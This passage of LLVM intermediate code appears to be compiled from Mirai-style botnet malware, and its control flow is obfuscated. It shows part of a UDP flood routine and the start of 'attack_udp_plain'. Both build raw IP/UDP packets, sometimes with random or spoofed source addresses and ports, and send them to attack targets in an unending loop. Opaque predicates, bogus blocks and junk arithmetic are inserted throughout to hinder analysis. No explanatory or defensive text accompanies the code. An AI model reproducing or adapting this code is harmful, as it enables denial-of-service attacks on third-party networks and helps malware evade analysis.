  %178 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %179 = load i32, i32* %9, align 4
  %180 = sext i32 %179 to i64
  %181 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %178, i64 %180
  %182 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %181, i32 0, i32 1
  %183 = load i32, i32* %182, align 4
  %184 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %185 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %184, i32 0, i32 9
  store i32 %183, i32* %185, align 4
  %186 = load i16, i16* %16, align 2
  %187 = call zeroext i16 @htons(i16 zeroext %186) #7
  %188 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %189 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %188, i32 0, i32 0
  store i16 %187, i16* %189, align 2
  %190 = load i16, i16* %17, align 2
  %191 = call zeroext i16 @htons(i16 zeroext %190) #7
  %192 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %193 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %192, i32 0, i32 1
  store i16 %191, i16* %193, align 2
  %194 = load i32, i32* %19, align 4
  %195 = sext i32 %194 to i64
  %196 = add i64 12, %195
  %197 = trunc i64 %196 to i16
  %198 = call zeroext i16 @htons(i16 zeroext %197) #7
  %199 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %200 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %199, i32 0, i32 2
  store i16 %198, i16* %200, align 2
  %201 = load i8*, i8** %22, align 8
  %202 = bitcast i8* %201 to i32*
  store i32 -1, i32* %202, align 4
  %203 = load i8*, i8** %22, align 8
  %204 = getelementptr inbounds i8, i8* %203, i64 4
  store i8* %204, i8** %22, align 8
  %205 = load i8*, i8** %22, align 8
  %206 = load i8*, i8** %18, align 8
  %207 = load i32, i32* %19, align 4
  call void @util_memcpy(i8* %205, i8* %206, i32 %207)
  br label %208

; <label>:208:                                    ; preds = %172
  %209 = load i32, i32* @x.29
  %210 = load i32, i32* @y.30
  %211 = sub i32 %209, 1
  %212 = mul i32 %209, %211
  %213 = urem i32 %212, 2
  %214 = icmp eq i32 %213, 0
  %215 = icmp slt i32 %210, 10
  %216 = or i1 %214, %215
  br i1 %216, label %originalBB50, label %originalBB50alteredBB

originalBB50:                                     ; preds = %originalBB50alteredBB, %208
  %217 = load i32, i32* %9, align 4
  %218 = add nsw i32 %217, 1
  store i32 %218, i32* %9, align 4
  %219 = load i32, i32* @x.29
  %220 = load i32, i32* @y.30
  %221 = sub i32 %219, 1
  %222 = mul i32 %219, %221
  %223 = urem i32 %222, 2
  %224 = icmp eq i32 %223, 0
  %225 = icmp slt i32 %220, 10
  %226 = or i1 %224, %225
  br i1 %226, label %originalBBpart260, label %originalBB50alteredBB

originalBBpart260:                                ; preds = %originalBB50
  br label %100

; <label>:227:                                    ; preds = %100
  br label %228

; <label>:228:                                    ; preds = %399, %227
  store i32 0, i32* %9, align 4
  br label %229

; <label>:229:                                    ; preds = %396, %228
  %230 = load i32, i32* %9, align 4
  %231 = load i8, i8* %5, align 1
  %232 = zext i8 %231 to i32
  %233 = icmp slt i32 %230, %232
  br i1 %233, label %234, label %399

; <label>:234:                                    ; preds = %229
  %235 = load i32, i32* @x.29
  %236 = load i32, i32* @y.30
  %237 = sub i32 %235, 1
  %238 = mul i32 %235, %237
  %239 = urem i32 %238, 2
  %240 = icmp eq i32 %239, 0
  %241 = icmp slt i32 %236, 10
  %242 = or i1 %240, %241
  br i1 %242, label %originalBB62, label %originalBB62alteredBB

originalBB62:                                     ; preds = %originalBB62alteredBB, %234
  %243 = load i8**, i8*** %11, align 8
  %244 = load i32, i32* %9, align 4
  %245 = sext i32 %244 to i64
  %246 = getelementptr inbounds i8*, i8** %243, i64 %245
  %247 = load i8*, i8** %246, align 8
  store i8* %247, i8** %23, align 8
  %248 = load i8*, i8** %23, align 8
  %249 = bitcast i8* %248 to %struct.iphdr*
  store %struct.iphdr* %249, %struct.iphdr** %24, align 8
  %250 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %251 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %250, i64 1
  %252 = bitcast %struct.iphdr* %251 to %struct.udphdr*
  store %struct.udphdr* %252, %struct.udphdr** %25, align 8
  %253 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %254 = load i32, i32* %9, align 4
  %255 = sext i32 %254 to i64
  %256 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %253, i64 %255
  %257 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %256, i32 0, i32 2
  %258 = load i8, i8* %257, align 4
  %259 = zext i8 %258 to i32
  %260 = icmp slt i32 %259, 32
  %261 = load i32, i32* @x.29
  %262 = load i32, i32* @y.30
  %263 = sub i32 %261, 1
  %264 = mul i32 %261, %263
  %265 = urem i32 %264, 2
  %266 = icmp eq i32 %265, 0
  %267 = icmp slt i32 %262, 10
  %268 = or i1 %266, %267
  br i1 %268, label %originalBBpart264, label %originalBB62alteredBB

originalBBpart264:                                ; preds = %originalBB62
  br i1 %260, label %269, label %290

; <label>:269:                                    ; preds = %originalBBpart264
  %270 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %271 = load i32, i32* %9, align 4
  %272 = sext i32 %271 to i64
  %273 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %270, i64 %272
  %274 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %273, i32 0, i32 1
  %275 = load i32, i32* %274, align 4
  %276 = call i32 @ntohl(i32 %275) #7
  %277 = call i32 @rand_next()
  %278 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %279 = load i32, i32* %9, align 4
  %280 = sext i32 %279 to i64
  %281 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %278, i64 %280
  %282 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %281, i32 0, i32 2
  %283 = load i8, i8* %282, align 4
  %284 = zext i8 %283 to i32
  %285 = lshr i32 %277, %284
  %286 = add i32 %276, %285
  %287 = call i32 @htonl(i32 %286) #7
  %288 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %289 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %288, i32 0, i32 9
  store i32 %287, i32* %289, align 4
  br label %290

; <label>:290:                                    ; preds = %269, %originalBBpart264
  %291 = load i32, i32* @x.29
  %292 = load i32, i32* @y.30
  %293 = sub i32 %291, 1
  %294 = mul i32 %291, %293
  %295 = urem i32 %294, 2
  %296 = icmp eq i32 %295, 0
  %297 = icmp slt i32 %292, 10
  %298 = or i1 %296, %297
  br i1 %298, label %originalBB66, label %originalBB66alteredBB

originalBB66:                                     ; preds = %originalBB66alteredBB, %290
  %299 = load i16, i16* %13, align 2
  %300 = zext i16 %299 to i32
  %301 = icmp eq i32 %300, 65535
  %302 = load i32, i32* @x.29
  %303 = load i32, i32* @y.30
  %304 = sub i32 %302, 1
  %305 = mul i32 %302, %304
  %306 = urem i32 %305, 2
  %307 = icmp eq i32 %306, 0
  %308 = icmp slt i32 %303, 10
  %309 = or i1 %307, %308
  br i1 %309, label %originalBBpart268, label %originalBB66alteredBB

originalBBpart268:                                ; preds = %originalBB66
  br i1 %301, label %310, label %315

; <label>:310:                                    ; preds = %originalBBpart268
  %311 = call i32 @rand_next()
  %312 = trunc i32 %311 to i16
  %313 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %314 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %313, i32 0, i32 3
  store i16 %312, i16* %314, align 4
  br label %315

; <label>:315:                                    ; preds = %310, %originalBBpart268
  %316 = load i32, i32* @x.29
  %317 = load i32, i32* @y.30
  %318 = sub i32 %316, 1
  %319 = mul i32 %316, %318
  %320 = urem i32 %319, 2
  %321 = icmp eq i32 %320, 0
  %322 = icmp slt i32 %317, 10
  %323 = or i1 %321, %322
  br i1 %323, label %originalBB70, label %originalBB70alteredBB

originalBB70:                                     ; preds = %originalBB70alteredBB, %315
  %324 = load i16, i16* %16, align 2
  %325 = zext i16 %324 to i32
  %326 = icmp eq i32 %325, 65535
  %327 = load i32, i32* @x.29
  %328 = load i32, i32* @y.30
  %329 = sub i32 %327, 1
  %330 = mul i32 %327, %329
  %331 = urem i32 %330, 2
  %332 = icmp eq i32 %331, 0
  %333 = icmp slt i32 %328, 10
  %334 = or i1 %332, %333
  br i1 %334, label %originalBBpart272, label %originalBB70alteredBB

originalBBpart272:                                ; preds = %originalBB70
  br i1 %326, label %335, label %340

; <label>:335:                                    ; preds = %originalBBpart272
  %336 = call i32 @rand_next()
  %337 = trunc i32 %336 to i16
  %338 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %339 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %338, i32 0, i32 0
  store i16 %337, i16* %339, align 2
  br label %340

; <label>:340:                                    ; preds = %335, %originalBBpart272
  %341 = load i16, i16* %17, align 2
  %342 = zext i16 %341 to i32
  %343 = icmp eq i32 %342, 65535
  br i1 %343, label %344, label %349

; <label>:344:                                    ; preds = %340
  %345 = call i32 @rand_next()
  %346 = trunc i32 %345 to i16
  %347 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %348 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %347, i32 0, i32 1
  store i16 %346, i16* %348, align 2
  br label %349

; <label>:349:                                    ; preds = %344, %340
  %350 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %351 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %350, i32 0, i32 7
  store i16 0, i16* %351, align 2
  %352 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %353 = bitcast %struct.iphdr* %352 to i16*
  %354 = call zeroext i16 @checksum_generic(i16* %353, i32 20)
  %355 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %356 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %355, i32 0, i32 7
  store i16 %354, i16* %356, align 2
  %357 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %358 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %357, i32 0, i32 3
  store i16 0, i16* %358, align 2
  %359 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %360 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %361 = bitcast %struct.udphdr* %360 to i8*
  %362 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %363 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %362, i32 0, i32 2
  %364 = load i16, i16* %363, align 2
  %365 = load i32, i32* %19, align 4
  %366 = sext i32 %365 to i64
  %367 = add i64 12, %366
  %368 = trunc i64 %367 to i32
  %369 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %359, i8* %361, i16 zeroext %364, i32 %368)
  %370 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %371 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %370, i32 0, i32 3
  store i16 %369, i16* %371, align 2
  %372 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %373 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %372, i32 0, i32 1
  %374 = load i16, i16* %373, align 2
  %375 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %376 = load i32, i32* %9, align 4
  %377 = sext i32 %376 to i64
  %378 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %375, i64 %377
  %379 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %378, i32 0, i32 0
  %380 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %379, i32 0, i32 1
  store i16 %374, i16* %380, align 2
  %381 = load i32, i32* %10, align 4
  %382 = load i8*, i8** %23, align 8
  %383 = load i32, i32* %19, align 4
  %384 = sext i32 %383 to i64
  %385 = add i64 32, %384
  %386 = bitcast %union.__CONST_SOCKADDR_ARG* %26 to %struct.sockaddr**
  %387 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %388 = load i32, i32* %9, align 4
  %389 = sext i32 %388 to i64
  %390 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %387, i64 %389
  %391 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %390, i32 0, i32 0
  %392 = bitcast %struct.sockaddr_in* %391 to %struct.sockaddr*
  store %struct.sockaddr* %392, %struct.sockaddr** %386, align 8
  %393 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %26, i32 0, i32 0
  %394 = load %struct.sockaddr*, %struct.sockaddr** %393, align 8
  %395 = call i64 @sendto(i32 %381, i8* %382, i64 %385, i32 16384, %struct.sockaddr* %394, i32 16)
  br label %396

; <label>:396:                                    ; preds = %349
  %397 = load i32, i32* %9, align 4
  %398 = add nsw i32 %397, 1
  store i32 %398, i32* %9, align 4
  br label %229

; <label>:399:                                    ; preds = %229
  br label %228

; <label>:400:                                    ; preds = %96, %originalBBpart2
  %401 = load i32, i32* @x.29
  %402 = load i32, i32* @y.30
  %403 = sub i32 %401, 1
  %404 = mul i32 %401, %403
  %405 = urem i32 %404, 2
  %406 = icmp eq i32 %405, 0
  %407 = icmp slt i32 %402, 10
  %408 = or i1 %406, %407
  br i1 %408, label %originalBB74, label %originalBB74alteredBB

originalBB74:                                     ; preds = %originalBB74alteredBB, %400
  %409 = load i32, i32* @x.29
  %410 = load i32, i32* @y.30
  %411 = sub i32 %409, 1
  %412 = mul i32 %409, %411
  %413 = urem i32 %412, 2
  %414 = icmp eq i32 %413, 0
  %415 = icmp slt i32 %410, 10
  %416 = or i1 %414, %415
  br i1 %416, label %originalBBpart276, label %originalBB74alteredBB

originalBBpart276:                                ; preds = %originalBB74
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %58
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %75
  store i32 1, i32* %9, align 4
  %417 = load i32, i32* %10, align 4
  %418 = bitcast i32* %9 to i8*
  %419 = call i32 @setsockopt(i32 %417, i32 0, i32 3, i8* %418, i32 4) #6
  %420 = icmp eq i32 %419, -1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %105
  %421 = call noalias i8* @calloc(i64 128, i64 1) #6
  %422 = load i8**, i8*** %11, align 8
  %423 = load i32, i32* %9, align 4
  %424 = sext i32 %423 to i64
  %425 = getelementptr inbounds i8*, i8** %422, i64 %424
  store i8* %421, i8** %425, align 8
  %426 = load i8**, i8*** %11, align 8
  %427 = load i32, i32* %9, align 4
  %428 = sext i32 %427 to i64
  %429 = getelementptr inbounds i8*, i8** %426, i64 %428
  %430 = load i8*, i8** %429, align 8
  %431 = bitcast i8* %430 to %struct.iphdr*
  store %struct.iphdr* %431, %struct.iphdr** %20, align 8
  %432 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %433 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %432, i64 1
  %434 = bitcast %struct.iphdr* %433 to %struct.udphdr*
  store %struct.udphdr* %434, %struct.udphdr** %21, align 8
  %435 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %436 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %435, i64 1
  %437 = bitcast %struct.udphdr* %436 to i8*
  store i8* %437, i8** %22, align 8
  %438 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %439 = bitcast %struct.iphdr* %438 to i8*
  %440 = load i8, i8* %439, align 4
  %_ = shl i8 %440, 15
  %_7 = sub i8 0, %440
  %gen = add i8 %_7, 15
  %_8 = sub i8 %440, 15
  %gen9 = mul i8 %_8, 15
  %_10 = shl i8 %440, 15
  %_11 = sub i8 %440, 15
  %gen12 = mul i8 %_11, 15
  %_13 = sub i8 %440, 15
  %gen14 = mul i8 %_13, 15
  %_15 = sub i8 0, %440
  %gen16 = add i8 %_15, 15
  %_17 = shl i8 %440, 15
  %_18 = sub i8 %440, 15
  %gen19 = mul i8 %_18, 15
  %441 = and i8 %440, 15
  %_20 = sub i8 0, %441
  %gen21 = add i8 %_20, 64
  %_22 = sub i8 %441, 64
  %gen23 = mul i8 %_22, 64
  %_24 = shl i8 %441, 64
  %_25 = sub i8 %441, 64
  %gen26 = mul i8 %_25, 64
  %442 = or i8 %441, 64
  store i8 %442, i8* %439, align 4
  %443 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %444 = bitcast %struct.iphdr* %443 to i8*
  %445 = load i8, i8* %444, align 4
  %_27 = sub i8 %445, -16
  %gen28 = mul i8 %_27, -16
  %_29 = shl i8 %445, -16
  %_30 = shl i8 %445, -16
  %_31 = sub i8 %445, -16
  %gen32 = mul i8 %_31, -16
  %_33 = sub i8 %445, -16
  %gen34 = mul i8 %_33, -16
  %_35 = shl i8 %445, -16
  %446 = and i8 %445, -16
  %_36 = shl i8 %446, 5
  %447 = or i8 %446, 5
  store i8 %447, i8* %444, align 4
  %448 = load i8, i8* %12, align 1
  %449 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %450 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %449, i32 0, i32 1
  store i8 %448, i8* %450, align 1
  %451 = load i32, i32* %19, align 4
  %452 = sext i32 %451 to i64
  %_37 = sub i64 0, 32
  %gen38 = add i64 %_37, %452
  %_39 = sub i64 32, %452
  %gen40 = mul i64 %_39, %452
  %_41 = sub i64 0, 32
  %gen42 = add i64 %_41, %452
  %_43 = sub i64 32, %452
  %gen44 = mul i64 %_43, %452
  %_45 = sub i64 0, 32
  %gen46 = add i64 %_45, %452
  %453 = add i64 32, %452
  %454 = trunc i64 %453 to i16
  %455 = call zeroext i16 @htons(i16 zeroext %454) #7
  %456 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %457 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %456, i32 0, i32 2
  store i16 %455, i16* %457, align 2
  %458 = load i16, i16* %13, align 2
  %459 = call zeroext i16 @htons(i16 zeroext %458) #7
  %460 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %461 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %460, i32 0, i32 3
  store i16 %459, i16* %461, align 4
  %462 = load i8, i8* %14, align 1
  %463 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %464 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %463, i32 0, i32 5
  store i8 %462, i8* %464, align 4
  %465 = load i8, i8* %15, align 1
  %466 = icmp ne i8 %465, 0
  br label %originalBB6

originalBB50alteredBB:                            ; preds = %originalBB50, %208
  %467 = load i32, i32* %9, align 4
  %_51 = sub i32 0, %467
  %gen52 = add i32 %_51, 1
  %_53 = shl i32 %467, 1
  %_54 = sub i32 %467, 1
  %gen55 = mul i32 %_54, 1
  %_56 = sub i32 0, %467
  %gen57 = add i32 %_56, 1
  %_58 = shl i32 %467, 1
  %468 = add nsw i32 %467, 1
  store i32 %468, i32* %9, align 4
  br label %originalBB50

originalBB62alteredBB:                            ; preds = %originalBB62, %234
  %469 = load i8**, i8*** %11, align 8
  %470 = load i32, i32* %9, align 4
  %471 = sext i32 %470 to i64
  %472 = getelementptr inbounds i8*, i8** %469, i64 %471
  %473 = load i8*, i8** %472, align 8
  store i8* %473, i8** %23, align 8
  %474 = load i8*, i8** %23, align 8
  %475 = bitcast i8* %474 to %struct.iphdr*
  store %struct.iphdr* %475, %struct.iphdr** %24, align 8
  %476 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %477 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %476, i64 1
  %478 = bitcast %struct.iphdr* %477 to %struct.udphdr*
  store %struct.udphdr* %478, %struct.udphdr** %25, align 8
  %479 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %480 = load i32, i32* %9, align 4
  %481 = sext i32 %480 to i64
  %482 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %479, i64 %481
  %483 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %482, i32 0, i32 2
  %484 = load i8, i8* %483, align 4
  %485 = zext i8 %484 to i32
  %486 = icmp slt i32 %485, 32
  br label %originalBB62

originalBB66alteredBB:                            ; preds = %originalBB66, %290
  %487 = load i16, i16* %13, align 2
  %488 = zext i16 %487 to i32
  %489 = icmp eq i32 %488, 65535
  br label %originalBB66

originalBB70alteredBB:                            ; preds = %originalBB70, %315
  %490 = load i16, i16* %16, align 2
  %491 = zext i16 %490 to i32
  %492 = icmp eq i32 %491, 65535
  br label %originalBB70

originalBB74alteredBB:                            ; preds = %originalBB74, %400
  br label %originalBB74
}

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_plain(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i8**, align 8
  %11 = alloca i32*, align 8
  %12 = alloca i16, align 2
  %13 = alloca i16, align 2
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca %struct.iphdr*, align 8
  %18 = alloca %struct.udphdr*, align 8
  %19 = alloca i8*, align 8
  %20 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %21 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %22 = alloca i8*, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %23 = load i8, i8* %5, align 1
  %24 = zext i8 %23 to i64
  %25 = call noalias i8* @calloc(i64 %24, i64 8) #6
  %26 = bitcast i8* %25 to i8**
  store i8** %26, i8*** %10, align 8
  %27 = load i8, i8* %5, align 1
  %28 = zext i8 %27 to i64
  %29 = call noalias i8* @calloc(i64 %28, i64 4) #6
  %30 = bitcast i8* %29 to i32*
  store i32* %30, i32** %11, align 8
  %31 = load i8, i8* %7, align 1
  %32 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %33 = call i32 @attack_get_opt_int(i8 zeroext %31, %struct.attack_option* %32, i8 zeroext 7, i32 65535)
  %34 = trunc i32 %33 to i16
  store i16 %34, i16* %12, align 2
  %35 = load i8, i8* %7, align 1
  %36 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %37 = call i32 @attack_get_opt_int(i8 zeroext %35, %struct.attack_option* %36, i8 zeroext 6, i32 65535)
  %38 = trunc i32 %37 to i16
  store i16 %38, i16* %13, align 2
  %39 = load i8, i8* %7, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %41 = call i32 @attack_get_opt_int(i8 zeroext %39, %struct.attack_option* %40, i8 zeroext 0, i32 512)
  %42 = trunc i32 %41 to i16
  store i16 %42, i16* %14, align 2
  %43 = load i8, i8* %7, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %45 = call i32 @attack_get_opt_int(i8 zeroext %43, %struct.attack_option* %44, i8 zeroext 1, i32 1)
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %15, align 1
  %47 = bitcast %struct.sockaddr_in* %16 to i8*
  call void @llvm.memset.p0i8.i64(i8* %47, i8 0, i64 16, i32 4, i1 false)
  %48 = load i16, i16* %13, align 2
  %49 = zext i16 %48 to i32
  %50 = icmp eq i32 %49, 65535
  br i1 %50, label %51, label %54

; <label>:51:                                     ; preds = %4
  %52 = call i32 @rand_next()
  %53 = trunc i32 %52 to i16
  store i16 %53, i16* %13, align 2
  br label %73

; <label>:54:                                     ; preds = %4
  %55 = load i32, i32* @x.31
  %56 = load i32, i32* @y.32
  %57 = sub i32 %55, 1
  %58 = mul i32 %55, %57
  %59 = urem i32 %58, 2
  %60 = icmp eq i32 %59, 0
  %61 = icmp slt i32 %56, 10
  %62 = or i1 %60, %61
  br i1 %62, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %54
  %63 = load i16, i16* %13, align 2
  %64 = call zeroext i16 @htons(i16 zeroext %63) #7
  store i16 %64, i16* %13, align 2
  %65 = load i32, i32* @x.31
  %66 = load i32, i32* @y.32
  %67 = sub i32 %65, 1
  %68 = mul i32 %65, %67
  %69 = urem i32 %68, 2
  %70 = icmp eq i32 %69, 0
  %71 = icmp slt i32 %66, 10
  %72 = or i1 %70, %71
  br i1 %72, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %73

; <label>:73:                                     ; preds = %originalBBpart2, %51
  %74 = load i32, i32* @x.31
  %75 = load i32, i32* @y.32
  %76 = sub i32 %74, 1
  %77 = mul i32 %74, %76
  %78 = urem i32 %77, 2
  %79 = icmp eq i32 %78, 0
  %80 = icmp slt i32 %75, 10
  %81 = or i1 %79, %80
  br i1 %81, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %73
  store i32 0, i32* %9, align 4
  %82 = load i32, i32* @x.31
  %83 = load i32, i32* @y.32
  %84 = sub i32 %82, 1
  %85 = mul i32 %82, %84
  %86 = urem i32 %85, 2
  %87 = icmp eq i32 %86, 0
  %88 = icmp slt i32 %83, 10
  %89 = or i1 %87, %88
  br i1 %89, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %90

; <label>:90:                                     ; preds = %266, %originalBBpart24
  %91 = load i32, i32* %9, align 4
  %92 = load i8, i8* %5, align 1
  %93 = zext i8 %92 to i32
  %94 = icmp slt i32 %91, %93
  br i1 %94, label %95, label %269

; <label>:95:                                     ; preds = %90
  %96 = call noalias i8* @calloc(i64 65535, i64 1) #6
  %97 = load i8**, i8*** %10, align 8
  %98 = load i32, i32* %9, align 4
  %99 = sext i32 %98 to i64
  %100 = getelementptr inbounds i8*, i8** %97, i64 %99
  store i8* %96, i8** %100, align 8
  %101 = load i16, i16* %12, align 2
  %102 = zext i16 %101 to i32
  %103 = icmp eq i32 %102, 65535
  br i1 %103, label %104, label %129

; <label>:104:                                    ; preds = %95
  %105 = load i32, i32* @x.31
  %106 = load i32, i32* @y.32
  %107 = sub i32 %105, 1
  %108 = mul i32 %105, %107
  %109 = urem i32 %108, 2
  %110 = icmp eq i32 %109, 0
  %111 = icmp slt i32 %106, 10
  %112 = or i1 %110, %111
  br i1 %112, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %104
  %113 = call i32 @rand_next()
  %114 = trunc i32 %113 to i16
  %115 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %116 = load i32, i32* %9, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %115, i64 %117
  %119 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %118, i32 0, i32 0
  %120 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %119, i32 0, i32 1
  store i16 %114, i16* %120, align 2
  %121 = load i32, i32* @x.31
  %122 = load i32, i32* @y.32
  %123 = sub i32 %121, 1
  %124 = mul i32 %121, %123
  %125 = urem i32 %124, 2
  %126 = icmp eq i32 %125, 0
  %127 = icmp slt i32 %122, 10
  %128 = or i1 %126, %127
  br i1 %128, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %138

; <label>:129:                                    ; preds = %95
  %130 = load i16, i16* %12, align 2
  %131 = call zeroext i16 @htons(i16 zeroext %130) #7
  %132 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %133 = load i32, i32* %9, align 4
  %134 = sext i32 %133 to i64
  %135 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %132, i64 %134
  %136 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %135, i32 0, i32 0
  %137 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %136, i32 0, i32 1
  store i16 %131, i16* %137, align 2
  br label %138

; <label>:138:                                    ; preds = %129, %originalBBpart28
  %139 = call i32 @socket(i32 2, i32 2, i32 17) #6
  %140 = load i32*, i32** %11, align 8
  %141 = load i32, i32* %9, align 4
  %142 = sext i32 %141 to i64
  %143 = getelementptr inbounds i32, i32* %140, i64 %142
  store i32 %139, i32* %143, align 4
  %144 = icmp eq i32 %139, -1
  br i1 %144, label %145, label %162

; <label>:145:                                    ; preds = %138
  %146 = load i32, i32* @x.31
  %147 = load i32, i32* @y.32
  %148 = sub i32 %146, 1
  %149 = mul i32 %146, %148
  %150 = urem i32 %149, 2
  %151 = icmp eq i32 %150, 0
  %152 = icmp slt i32 %147, 10
  %153 = or i1 %151, %152
  br i1 %153, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %145
  %154 = load i32, i32* @x.31
  %155 = load i32, i32* @y.32
  %156 = sub i32 %154, 1
  %157 = mul i32 %154, %156
  %158 = urem i32 %157, 2
  %159 = icmp eq i32 %158, 0
  %160 = icmp slt i32 %155, 10
  %161 = or i1 %159, %160
  br i1 %161, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  ret void

; <label>:162:                                    ; preds = %138
  %163 = load i32, i32* @x.31
  %164 = load i32, i32* @y.32
  %165 = sub i32 %163, 1
  %166 = mul i32 %163, %165
  %167 = urem i32 %166, 2
  %168 = icmp eq i32 %167, 0
  %169 = icmp slt i32 %164, 10
  %170 = or i1 %168, %169
  br i1 %170, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %162
  %171 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %171, align 4
  %172 = load i16, i16* %13, align 2
  %173 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %172, i16* %173, align 2
  %174 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
